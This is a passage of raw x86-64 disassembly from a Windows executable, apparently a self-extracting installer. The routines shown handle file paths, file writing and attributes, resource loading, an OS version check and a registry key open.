   140007b3d:	48 8d 54 24 50       	lea    0x50(%rsp),%rdx
   140007b42:	48 8d 0d c7 5a 00 00 	lea    0x5ac7(%rip),%rcx        # 0x14000d610
   140007b49:	41 ba 04 01 00 00    	mov    $0x104,%r10d
   140007b4f:	49 8b e9             	mov    %r9,%rbp
   140007b52:	48 2b c8             	sub    %rax,%rcx
   140007b55:	bb 01 00 00 00       	mov    $0x1,%ebx
   140007b5a:	45 8b ca             	mov    %r10d,%r9d
   140007b5d:	49 8d 81 fa fe ff 7f 	lea    0x7ffffefa(%r9),%rax
   140007b64:	48 85 c0             	test   %rax,%rax
   140007b67:	74 11                	je     0x140007b7a
   140007b69:	8a 04 11             	mov    (%rcx,%rdx,1),%al
   140007b6c:	84 c0                	test   %al,%al
   140007b6e:	74 0a                	je     0x140007b7a
   140007b70:	88 02                	mov    %al,(%rdx)
   140007b72:	48 03 d3             	add    %rbx,%rdx
   140007b75:	4c 2b cb             	sub    %rbx,%r9
   140007b78:	75 e3                	jne    0x140007b5d
   140007b7a:	48 8d 42 ff          	lea    -0x1(%rdx),%rax
   140007b7e:	4d 85 c9             	test   %r9,%r9
   140007b81:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   140007b86:	48 0f 45 c2          	cmovne %rdx,%rax
   140007b8a:	41 8b d2             	mov    %r10d,%edx
   140007b8d:	c6 00 00             	movb   $0x0,(%rax)
   140007b90:	e8 73 02 00 00       	call   0x140007e08
   140007b95:	48 83 64 24 30 00    	andq   $0x0,0x30(%rsp)
   140007b9b:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   140007ba0:	c7 44 24 28 80 00 00 	movl   $0x80,0x28(%rsp)
   140007ba7:	00 
   140007ba8:	45 33 c9             	xor    %r9d,%r9d
   140007bab:	45 33 c0             	xor    %r8d,%r8d
   140007bae:	c7 44 24 20 02 00 00 	movl   $0x2,0x20(%rsp)
   140007bb5:	00 
   140007bb6:	ba 00 00 00 40       	mov    $0x40000000,%edx
   140007bbb:	48 ff 15 96 17 00 00 	rex.W call *0x1796(%rip)        # 0x140009358
   140007bc2:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140007bc7:	48 8b f8             	mov    %rax,%rdi
   140007bca:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   140007bce:	75 0e                	jne    0x140007bde
   140007bd0:	c7 05 6a 59 00 00 52 	movl   $0x80070052,0x596a(%rip)        # 0x14000d544
   140007bd7:	00 07 80 
   140007bda:	33 db                	xor    %ebx,%ebx
   140007bdc:	eb 45                	jmp    0x140007c23
   140007bde:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   140007be4:	4c 8d 4c 24 40       	lea    0x40(%rsp),%r9
   140007be9:	44 8b c6             	mov    %esi,%r8d
   140007bec:	48 8b d5             	mov    %rbp,%rdx
   140007bef:	48 8b cf             	mov    %rdi,%rcx
   140007bf2:	48 ff 15 e7 16 00 00 	rex.W call *0x16e7(%rip)        # 0x1400092e0
   140007bf9:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140007bfe:	85 c0                	test   %eax,%eax
   140007c00:	74 06                	je     0x140007c08
   140007c02:	3b 74 24 40          	cmp    0x40(%rsp),%esi
   140007c06:	74 0c                	je     0x140007c14
   140007c08:	c7 05 32 59 00 00 52 	movl   $0x80070052,0x5932(%rip)        # 0x14000d544
   140007c0f:	00 07 80 
   140007c12:	33 db                	xor    %ebx,%ebx
   140007c14:	48 8b cf             	mov    %rdi,%rcx
   140007c17:	48 ff 15 3a 16 00 00 	rex.W call *0x163a(%rip)        # 0x140009258
   140007c1e:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140007c23:	8b c3                	mov    %ebx,%eax
   140007c25:	48 8b 8c 24 60 01 00 	mov    0x160(%rsp),%rcx
   140007c2c:	00 
   140007c2d:	48 33 cc             	xor    %rsp,%rcx
   140007c30:	e8 bb 0a 00 00       	call   0x1400086f0
   140007c35:	48 8b 9c 24 98 01 00 	mov    0x198(%rsp),%rbx
   140007c3c:	00 
   140007c3d:	48 81 c4 70 01 00 00 	add    $0x170,%rsp
   140007c44:	5f                   	pop    %rdi
   140007c45:	5e                   	pop    %rsi
   140007c46:	5d                   	pop    %rbp
   140007c47:	c3                   	ret
   140007c48:	cc                   	int3
   140007c49:	cc                   	int3
   140007c4a:	cc                   	int3
   140007c4b:	cc                   	int3
   140007c4c:	cc                   	int3
   140007c4d:	cc                   	int3
   140007c4e:	cc                   	int3
   140007c4f:	cc                   	int3
   140007c50:	48 81 ec 48 01 00 00 	sub    $0x148,%rsp
   140007c57:	48 8b 05 aa 43 00 00 	mov    0x43aa(%rip),%rax        # 0x14000c008
   140007c5e:	48 33 c4             	xor    %rsp,%rax
   140007c61:	48 89 84 24 30 01 00 	mov    %rax,0x130(%rsp)
   140007c68:	00 
   140007c69:	ba 04 01 00 00       	mov    $0x104,%edx
   140007c6e:	4c 8d 0d 9b 59 00 00 	lea    0x599b(%rip),%r9        # 0x14000d610
   140007c75:	48 8d 44 24 20       	lea    0x20(%rsp),%rax
   140007c7a:	44 8b c2             	mov    %edx,%r8d
   140007c7d:	4c 2b c8             	sub    %rax,%r9
   140007c80:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140007c85:	49 8d 80 fa fe ff 7f 	lea    0x7ffffefa(%r8),%rax
   140007c8c:	48 85 c0             	test   %rax,%rax
   140007c8f:	74 13                	je     0x140007ca4
   140007c91:	41 8a 04 09          	mov    (%r9,%rcx,1),%al
   140007c95:	84 c0                	test   %al,%al
   140007c97:	74 0b                	je     0x140007ca4
   140007c99:	88 01                	mov    %al,(%rcx)
   140007c9b:	48 ff c1             	inc    %rcx
   140007c9e:	49 83 e8 01          	sub    $0x1,%r8
   140007ca2:	75 e1                	jne    0x140007c85
   140007ca4:	4d 85 c0             	test   %r8,%r8
   140007ca7:	48 8d 41 ff          	lea    -0x1(%rcx),%rax
   140007cab:	4c 8d 05 56 1b 00 00 	lea    0x1b56(%rip),%r8        # 0x140009808
   140007cb2:	48 0f 45 c1          	cmovne %rcx,%rax
   140007cb6:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140007cbb:	c6 00 00             	movb   $0x0,(%rax)
   140007cbe:	e8 45 01 00 00       	call   0x140007e08
   140007cc3:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140007cc8:	48 ff 15 59 15 00 00 	rex.W call *0x1559(%rip)        # 0x140009228
   140007ccf:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140007cd4:	83 f8 ff             	cmp    $0xffffffff,%eax
   140007cd7:	74 1d                	je     0x140007cf6
   140007cd9:	a8 10                	test   $0x10,%al
   140007cdb:	75 19                	jne    0x140007cf6
   140007cdd:	33 d2                	xor    %edx,%edx
   140007cdf:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140007ce4:	44 8d 42 08          	lea    0x8(%rdx),%r8d
   140007ce8:	48 ff 15 01 16 00 00 	rex.W call *0x1601(%rip)        # 0x1400092f0
   140007cef:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140007cf4:	eb 13                	jmp    0x140007d09
   140007cf6:	48 8d 0d 0b 1b 00 00 	lea    0x1b0b(%rip),%rcx        # 0x140009808
   140007cfd:	48 ff 15 34 15 00 00 	rex.W call *0x1534(%rip)        # 0x140009238
   140007d04:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140007d09:	48 8b 8c 24 30 01 00 	mov    0x130(%rsp),%rcx
   140007d10:	00 
   140007d11:	48 33 cc             	xor    %rsp,%rcx
   140007d14:	e8 d7 09 00 00       	call   0x1400086f0
   140007d19:	48 81 c4 48 01 00 00 	add    $0x148,%rsp
   140007d20:	c3                   	ret
   140007d21:	cc                   	int3
   140007d22:	cc                   	int3
   140007d23:	cc                   	int3
   140007d24:	cc                   	int3
   140007d25:	cc                   	int3
   140007d26:	cc                   	int3
   140007d27:	cc                   	int3
   140007d28:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140007d2d:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   140007d32:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140007d37:	57                   	push   %rdi
   140007d38:	48 83 ec 30          	sub    $0x30,%rsp
   140007d3c:	48 8b 1d 2d 61 00 00 	mov    0x612d(%rip),%rbx        # 0x14000de70
   140007d43:	49 8b e8             	mov    %r8,%rbp
   140007d46:	48 8b cb             	mov    %rbx,%rcx
   140007d49:	41 b8 05 00 00 00    	mov    $0x5,%r8d
   140007d4f:	49 8b f1             	mov    %r9,%rsi
   140007d52:	48 ff 15 af 15 00 00 	rex.W call *0x15af(%rip)        # 0x140009308
   140007d59:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140007d5e:	48 85 c0             	test   %rax,%rax
   140007d61:	74 60                	je     0x140007dc3
   140007d63:	48 8b d0             	mov    %rax,%rdx
   140007d66:	48 8b cb             	mov    %rbx,%rcx
   140007d69:	48 ff 15 28 16 00 00 	rex.W call *0x1628(%rip)        # 0x140009398
   140007d70:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140007d75:	48 8b f8             	mov    %rax,%rdi
   140007d78:	48 85 c0             	test   %rax,%rax
   140007d7b:	74 46                	je     0x140007dc3
   140007d7d:	48 8b 44 24 60       	mov    0x60(%rsp),%rax
   140007d82:	4c 8b ce             	mov    %rsi,%r9
   140007d85:	4c 8b c5             	mov    %rbp,%r8
   140007d88:	48 8b d7             	mov    %rdi,%rdx
   140007d8b:	48 8b cb             	mov    %rbx,%rcx
   140007d8e:	48 85 c0             	test   %rax,%rax
   140007d91:	75 07                	jne    0x140007d9a
   140007d93:	48 21 44 24 20       	and    %rax,0x20(%rsp)
   140007d98:	eb 05                	jmp    0x140007d9f
   140007d9a:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140007d9f:	48 ff 15 72 17 00 00 	rex.W call *0x1772(%rip)        # 0x140009518
   140007da6:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140007dab:	48 8b cf             	mov    %rdi,%rcx
   140007dae:	48 8b d8             	mov    %rax,%rbx
   140007db1:	48 ff 15 78 15 00 00 	rex.W call *0x1578(%rip)        # 0x140009330
   140007db8:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140007dbd:	48 83 fb ff          	cmp    $0xffffffffffffffff,%rbx
   140007dc1:	75 24                	jne    0x140007de7
   140007dc3:	83 64 24 28 00       	andl   $0x0,0x28(%rsp)
   140007dc8:	45 33 c9             	xor    %r9d,%r9d
   140007dcb:	45 33 c0             	xor    %r8d,%r8d
   140007dce:	c7 44 24 20 10 00 00 	movl   $0x10,0x20(%rsp)
   140007dd5:	00 
   140007dd6:	ba fb 04 00 00       	mov    $0x4fb,%edx
   140007ddb:	33 c9                	xor    %ecx,%ecx
   140007ddd:	e8 4a d1 ff ff       	call   0x140004f2c
   140007de2:	48 8b 5c 24 68       	mov    0x68(%rsp),%rbx
   140007de7:	48 8b 6c 24 48       	mov    0x48(%rsp),%rbp
   140007dec:	48 8b c3             	mov    %rbx,%rax
   140007def:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   140007df4:	48 8b 74 24 50       	mov    0x50(%rsp),%rsi
   140007df9:	48 83 c4 30          	add    $0x30,%rsp
   140007dfd:	5f                   	pop    %rdi
   140007dfe:	c3                   	ret
   140007dff:	cc                   	int3
   140007e00:	cc                   	int3
   140007e01:	cc                   	int3
   140007e02:	cc                   	int3
   140007e03:	cc                   	int3
   140007e04:	cc                   	int3
   140007e05:	cc                   	int3
   140007e06:	cc                   	int3
   140007e07:	cc                   	int3
   140007e08:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140007e0d:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   140007e12:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140007e17:	57                   	push   %rdi
   140007e18:	48 83 ec 20          	sub    $0x20,%rsp
   140007e1c:	49 8b f8             	mov    %r8,%rdi
   140007e1f:	8b ea                	mov    %edx,%ebp
   140007e21:	49 83 c8 ff          	or     $0xffffffffffffffff,%r8
   140007e25:	48 8b f1             	mov    %rcx,%rsi
   140007e28:	49 ff c0             	inc    %r8
   140007e2b:	42 80 3c 01 00       	cmpb   $0x0,(%rcx,%r8,1)
   140007e30:	75 f6                	jne    0x140007e28
   140007e32:	41 8d 40 01          	lea    0x1(%r8),%eax
   140007e36:	3b c5                	cmp    %ebp,%eax
   140007e38:	72 07                	jb     0x140007e41
   140007e3a:	b8 7a 00 07 80       	mov    $0x8007007a,%eax
   140007e3f:	eb 40                	jmp    0x140007e81
   140007e41:	41 8b d8             	mov    %r8d,%ebx
   140007e44:	48 03 de             	add    %rsi,%rbx
   140007e47:	48 3b de             	cmp    %rsi,%rbx
   140007e4a:	76 1a                	jbe    0x140007e66
   140007e4c:	48 8b d3             	mov    %rbx,%rdx
   140007e4f:	48 ff 15 02 17 00 00 	rex.W call *0x1702(%rip)        # 0x140009558
   140007e56:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140007e5b:	80 38 5c             	cmpb   $0x5c,(%rax)
   140007e5e:	74 06                	je     0x140007e66
   140007e60:	c6 03 5c             	movb   $0x5c,(%rbx)
   140007e63:	48 ff c3             	inc    %rbx
   140007e66:	c6 03 00             	movb   $0x0,(%rbx)
   140007e69:	eb 03                	jmp    0x140007e6e
   140007e6b:	48 ff c7             	inc    %rdi
   140007e6e:	80 3f 20             	cmpb   $0x20,(%rdi)
   140007e71:	74 f8                	je     0x140007e6b
   140007e73:	48 8b d5             	mov    %rbp,%rdx
   140007e76:	4c 8b c7             	mov    %rdi,%r8
   140007e79:	48 8b ce             	mov    %rsi,%rcx
   140007e7c:	e8 87 91 ff ff       	call   0x140001008
   140007e81:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140007e86:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   140007e8b:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   140007e90:	48 83 c4 20          	add    $0x20,%rsp
   140007e94:	5f                   	pop    %rdi
   140007e95:	c3                   	ret
   140007e96:	cc                   	int3
   140007e97:	cc                   	int3
   140007e98:	cc                   	int3
   140007e99:	cc                   	int3
   140007e9a:	cc                   	int3
   140007e9b:	cc                   	int3
   140007e9c:	cc                   	int3
   140007e9d:	cc                   	int3
   140007e9e:	cc                   	int3
   140007e9f:	cc                   	int3
   140007ea0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140007ea5:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   140007eaa:	57                   	push   %rdi
   140007eab:	48 83 ec 20          	sub    $0x20,%rsp
   140007eaf:	33 f6                	xor    %esi,%esi
   140007eb1:	48 8b f9             	mov    %rcx,%rdi
   140007eb4:	48 83 ca ff          	or     $0xffffffffffffffff,%rdx
   140007eb8:	48 ff c2             	inc    %rdx
   140007ebb:	40 38 34 11          	cmp    %sil,(%rcx,%rdx,1)
   140007ebf:	75 f7                	jne    0x140007eb8
   140007ec1:	48 03 d7             	add    %rdi,%rdx
   140007ec4:	48 ff 15 8d 16 00 00 	rex.W call *0x168d(%rip)        # 0x140009558
   140007ecb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140007ed0:	48 8b d0             	mov    %rax,%rdx
   140007ed3:	eb 08                	jmp    0x140007edd
   140007ed5:	80 3b 5c             	cmpb   $0x5c,(%rbx)
   140007ed8:	74 24                	je     0x140007efe
   140007eda:	48 8b d3             	mov    %rbx,%rdx
   140007edd:	48 8b cf             	mov    %rdi,%rcx
   140007ee0:	48 ff 15 71 16 00 00 	rex.W call *0x1671(%rip)        # 0x140009558
   140007ee7:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140007eec:	48 8b d8             	mov    %rax,%rbx
   140007eef:	48 3b c7             	cmp    %rdi,%rax
   140007ef2:	77 e1                	ja     0x140007ed5
   140007ef4:	80 38 5c             	cmpb   $0x5c,(%rax)
   140007ef7:	75 36                	jne    0x140007f2f
   140007ef9:	48 3b c7             	cmp    %rdi,%rax
   140007efc:	74 17                	je     0x140007f15
   140007efe:	48 8b d3             	mov    %rbx,%rdx
   140007f01:	48 8b cf             	mov    %rdi,%rcx
   140007f04:	48 ff 15 4d 16 00 00 	rex.W call *0x164d(%rip)        # 0x140009558
   140007f0b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140007f10:	80 38 3a             	cmpb   $0x3a,(%rax)
   140007f13:	75 12                	jne    0x140007f27
   140007f15:	48 8b cb             	mov    %rbx,%rcx
   140007f18:	48 ff 15 29 16 00 00 	rex.W call *0x1629(%rip)        # 0x140009548
   140007f1f:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140007f24:	48 8b d8             	mov    %rax,%rbx
   140007f27:	40 88 33             	mov    %sil,(%rbx)
   140007f2a:	be 01 00 00 00       	mov    $0x1,%esi
   140007f2f:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140007f34:	8b c6                	mov    %esi,%eax
   140007f36:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   140007f3b:	48 83 c4 20          	add    $0x20,%rsp
   140007f3f:	5f                   	pop    %rdi
   140007f40:	c3                   	ret
   140007f41:	cc                   	int3
   140007f42:	cc                   	int3
   140007f43:	cc                   	int3
   140007f44:	cc                   	int3
   140007f45:	cc                   	int3
   140007f46:	cc                   	int3
   140007f47:	cc                   	int3
   140007f48:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140007f4d:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   140007f52:	57                   	push   %rdi
   140007f53:	48 83 ec 20          	sub    $0x20,%rsp
   140007f57:	80 39 00             	cmpb   $0x0,(%rcx)
   140007f5a:	0f b7 f2             	movzwl %dx,%esi
   140007f5d:	48 8b d9             	mov    %rcx,%rbx
   140007f60:	74 3c                	je     0x140007f9e
   140007f62:	0f b7 3b             	movzwl (%rbx),%edi
   140007f65:	40 3a fe             	cmp    %sil,%dil
   140007f68:	75 18                	jne    0x140007f82
   140007f6a:	40 8a cf             	mov    %dil,%cl
   140007f6d:	48 ff 15 f4 12 00 00 	rex.W call *0x12f4(%rip)        # 0x140009268
   140007f74:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140007f79:	85 c0                	test   %eax,%eax
   140007f7b:	74 1c                	je     0x140007f99
   140007f7d:	66 3b fe             	cmp    %si,%di
   140007f80:	74 17                	je     0x140007f99
   140007f82:	48 8b cb             	mov    %rbx,%rcx
   140007f85:	48 ff 15 bc 15 00 00 	rex.W call *0x15bc(%rip)        # 0x140009548
   140007f8c:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140007f91:	48 8b d8             	mov    %rax,%rbx
   140007f94:	80 38 00             	cmpb   $0x0,(%rax)
   140007f97:	eb c7                	jmp    0x140007f60
   140007f99:	48 8b c3             	mov    %rbx,%rax
   140007f9c:	eb 02                	jmp    0x140007fa0
   140007f9e:	33 c0                	xor    %eax,%eax
   140007fa0:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140007fa5:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   140007faa:	48 83 c4 20          	add    $0x20,%rsp
   140007fae:	5f                   	pop    %rdi
   140007faf:	c3                   	ret
   140007fb0:	cc                   	int3
   140007fb1:	cc                   	int3
   140007fb2:	cc                   	int3
   140007fb3:	cc                   	int3
   140007fb4:	cc                   	int3
   140007fb5:	cc                   	int3
   140007fb6:	cc                   	int3
   140007fb7:	cc                   	int3
   140007fb8:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140007fbd:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   140007fc2:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140007fc7:	57                   	push   %rdi
   140007fc8:	48 83 ec 20          	sub    $0x20,%rsp
   140007fcc:	33 db                	xor    %ebx,%ebx
   140007fce:	0f b7 ea             	movzwl %dx,%ebp
   140007fd1:	48 8b f9             	mov    %rcx,%rdi
   140007fd4:	38 19                	cmp    %bl,(%rcx)
   140007fd6:	74 51                	je     0x140008029
   140007fd8:	0f b7 37             	movzwl (%rdi),%esi
   140007fdb:	40 3a f5             	cmp    %bpl,%sil
   140007fde:	75 21                	jne    0x140008001
   140007fe0:	40 8a ce             	mov    %sil,%cl
   140007fe3:	48 ff 15 7e 12 00 00 	rex.W call *0x127e(%rip)        # 0x140009268
   140007fea:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140007fef:	85 c0                	test   %eax,%eax
   140007ff1:	74 0a                	je     0x140007ffd
   140007ff3:	33 c0                	xor    %eax,%eax
   140007ff5:	66 3b f5             	cmp    %bp,%si
   140007ff8:	0f 95 c0             	setne  %al
   140007ffb:	eb 09                	jmp    0x140008006
   140007ffd:	33 c0                	xor    %eax,%eax
   140007fff:	eb 05                	jmp    0x140008006
   140008001:	b8 01 00 00 00       	mov    $0x1,%eax
   140008006:	85 c0                	test   %eax,%eax
   140008008:	48 8b cf             	mov    %rdi,%rcx
   14000800b:	48 0f 45 cb          	cmovne %rbx,%rcx
   14000800f:	48 8b d9             	mov    %rcx,%rbx
   140008012:	48 8b cf             	mov    %rdi,%rcx
   140008015:	48 ff 15 2c 15 00 00 	rex.W call *0x152c(%rip)        # 0x140009548
   14000801c:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140008021:	48 8b f8             	mov    %rax,%rdi
   140008024:	80 38 00             	cmpb   $0x0,(%rax)
   140008027:	75 af                	jne    0x140007fd8
   140008029:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   14000802e:	48 8b c3             	mov    %rbx,%rax
   140008031:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140008036:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   14000803b:	48 83 c4 20          	add    $0x20,%rsp
   14000803f:	5f                   	pop    %rdi
   140008040:	c3                   	ret
   140008041:	cc                   	int3
   140008042:	cc                   	int3
   140008043:	cc                   	int3
   140008044:	cc                   	int3
   140008045:	cc                   	int3
   140008046:	cc                   	int3
   140008047:	cc                   	int3
   140008048:	71 59                	jno    0x1400080a3
   14000804a:	dc 1e                	fcompl (%rsi)
   14000804c:	b5 1e                	mov    $0x1e,%ch
   14000804e:	24 af                	and    $0xaf,%al
   140008050:	4c 8b 44 24 28       	mov    0x28(%rsp),%r8
   140008055:	b8 01 00 00 00       	mov    $0x1,%eax
   14000805a:	49 3b 50 08          	cmp    0x8(%r8),%rdx
   14000805e:	75 1c                	jne    0x14000807c
   140008060:	41 0f b7 c9          	movzwl %r9w,%ecx
   140008064:	ba ff 03 00 00       	mov    $0x3ff,%edx
   140008069:	66 23 ca             	and    %dx,%cx
   14000806c:	66 41 39 08          	cmp    %cx,(%r8)
   140008070:	75 0a                	jne    0x14000807c
   140008072:	41 89 40 04          	mov    %eax,0x4(%r8)
   140008076:	33 c0                	xor    %eax,%eax
   140008078:	66 45 89 08          	mov    %r9w,(%r8)
   14000807c:	c3                   	ret
   14000807d:	cc                   	int3
   14000807e:	cc                   	int3
   14000807f:	cc                   	int3
   140008080:	cc                   	int3
   140008081:	cc                   	int3
   140008082:	cc                   	int3
   140008083:	cc                   	int3
   140008084:	48 8b c4             	mov    %rsp,%rax
   140008087:	48 89 58 08          	mov    %rbx,0x8(%rax)
   14000808b:	48 89 68 10          	mov    %rbp,0x10(%rax)
   14000808f:	57                   	push   %rdi
   140008090:	48 83 ec 40          	sub    $0x40,%rsp
   140008094:	8b 1d 6e 41 00 00    	mov    0x416e(%rip),%ebx        # 0x14000c208
   14000809a:	48 8b 3d cf 5d 00 00 	mov    0x5dcf(%rip),%rdi        # 0x14000de70
   1400080a1:	83 fb fe             	cmp    $0xfffffffe,%ebx
   1400080a4:	0f 85 91 00 00 00    	jne    0x14000813b
   1400080aa:	83 60 ec 00          	andl   $0x0,-0x14(%rax)
   1400080ae:	48 8d 40 e8          	lea    -0x18(%rax),%rax
   1400080b2:	83 25 4f 41 00 00 00 	andl   $0x0,0x414f(%rip)        # 0x14000c208
   1400080b9:	4c 8d 0d 90 ff ff ff 	lea    -0x70(%rip),%r9        # 0x140008050
   1400080c0:	bb 01 00 00 00       	mov    $0x1,%ebx
   1400080c5:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   1400080ca:	66 89 18             	mov    %bx,(%rax)
   1400080cd:	44 8b c3             	mov    %ebx,%r8d
   1400080d0:	48 8b cf             	mov    %rdi,%rcx
   1400080d3:	8d 6b 0f             	lea    0xf(%rbx),%ebp
   1400080d6:	48 89 68 08          	mov    %rbp,0x8(%rax)
   1400080da:	8b d5                	mov    %ebp,%edx
   1400080dc:	48 ff 15 a5 13 00 00 	rex.W call *0x13a5(%rip)        # 0x140009488
   1400080e3:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400080e8:	83 7c 24 34 00       	cmpl   $0x0,0x34(%rsp)
   1400080ed:	75 46                	jne    0x140008135
   1400080ef:	83 64 24 34 00       	andl   $0x0,0x34(%rsp)
   1400080f4:	8d 43 0c             	lea    0xc(%rbx),%eax
   1400080f7:	66 89 44 24 30       	mov    %ax,0x30(%rsp)
   1400080fc:	4c 8d 0d 4d ff ff ff 	lea    -0xb3(%rip),%r9        # 0x140008050
   140008103:	48 8d 44 24 30       	lea    0x30(%rsp),%rax
   140008108:	48 89 6c 24 38       	mov    %rbp,0x38(%rsp)
   14000810d:	44 8b c3             	mov    %ebx,%r8d
   140008110:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140008115:	8b d5                	mov    %ebp,%edx
   140008117:	48 8b cf             	mov    %rdi,%rcx
   14000811a:	48 ff 15 67 13 00 00 	rex.W call *0x1367(%rip)        # 0x140009488
   140008121:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140008126:	83 7c 24 34 00       	cmpl   $0x0,0x34(%rsp)
   14000812b:	75 08                	jne    0x140008135
   14000812d:	8b 1d d5 40 00 00    	mov    0x40d5(%rip),%ebx        # 0x14000c208
   140008133:	eb 06                	jmp    0x14000813b
   140008135:	89 1d cd 40 00 00    	mov    %ebx,0x40cd(%rip)        # 0x14000c208
   14000813b:	48 8b 6c 24 58       	mov    0x58(%rsp),%rbp
   140008140:	8b c3                	mov    %ebx,%eax
   140008142:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   140008147:	48 83 c4 40          	add    $0x40,%rsp
   14000814b:	5f                   	pop    %rdi
   14000814c:	c3                   	ret
   14000814d:	cc                   	int3
   14000814e:	cc                   	int3
   14000814f:	cc                   	int3
   140008150:	cc                   	int3
   140008151:	cc                   	int3
   140008152:	cc                   	int3
   140008153:	cc                   	int3
   140008154:	48 8b c4             	mov    %rsp,%rax
   140008157:	48 89 58 08          	mov    %rbx,0x8(%rax)
   14000815b:	48 89 70 10          	mov    %rsi,0x10(%rax)
   14000815f:	48 89 78 18          	mov    %rdi,0x18(%rax)
   140008163:	55                   	push   %rbp
   140008164:	48 8d 68 e8          	lea    -0x18(%rax),%rbp
   140008168:	48 81 ec 10 01 00 00 	sub    $0x110,%rsp
   14000816f:	48 8b 05 92 3e 00 00 	mov    0x3e92(%rip),%rax        # 0x14000c008
   140008176:	48 33 c4             	xor    %rsp,%rax
   140008179:	48 89 45 00          	mov    %rax,0x0(%rbp)
   14000817d:	8b 35 89 40 00 00    	mov    0x4089(%rip),%esi        # 0x14000c20c
   140008183:	c7 44 24 30 0c 00 00 	movl   $0xc,0x30(%rsp)
   14000818a:	00 
   14000818b:	83 fe fe             	cmp    $0xfffffffe,%esi
   14000818e:	0f 85 58 01 00 00    	jne    0x1400082ec
   140008194:	33 ff                	xor    %edi,%edi
   140008196:	c7 44 24 50 94 00 00 	movl   $0x94,0x50(%rsp)
   14000819d:	00 
   14000819e:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   1400081a3:	89 3d 63 40 00 00    	mov    %edi,0x4063(%rip)        # 0x14000c20c
   1400081a9:	48 ff 15 c0 11 00 00 	rex.W call *0x11c0(%rip)        # 0x140009370
   1400081b0:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400081b5:	85 c0                	test   %eax,%eax
   1400081b7:	0f 84 29 01 00 00    	je     0x1400082e6
   1400081bd:	8d 77 01             	lea    0x1(%rdi),%esi
   1400081c0:	39 74 24 60          	cmp    %esi,0x60(%rsp)
   1400081c4:	0f 85 1c 01 00 00    	jne    0x1400082e6
   1400081ca:	83 7c 24 54 04       	cmpl   $0x4,0x54(%rsp)
   1400081cf:	0f 85 11 01 00 00    	jne    0x1400082e6
   1400081d5:	83 7c 24 58 0a       	cmpl   $0xa,0x58(%rsp)
   1400081da:	0f 83 06 01 00 00    	jae    0x1400082e6
   1400081e0:	8d 4f 4a             	lea    0x4a(%rdi),%ecx
   1400081e3:	48 ff 15 f6 12 00 00 	rex.W call *0x12f6(%rip)        # 0x1400094e0
   1400081ea:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400081ef:	85 c0                	test   %eax,%eax
   1400081f1:	0f 84 ef 00 00 00    	je     0x1400082e6
   1400081f7:	48 8d 44 24 38       	lea    0x38(%rsp),%rax
   1400081fc:	41 b9 19 00 02 00    	mov    $0x20019,%r9d
   140008202:	45 33 c0             	xor    %r8d,%r8d
   140008205:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000820a:	48 8d 15 2f 18 00 00 	lea    0x182f(%rip),%rdx        # 0x140009a40
   140008211:	48 c7 c1 01 00 00 80 	mov    $0xffffffff80000001,%rcx
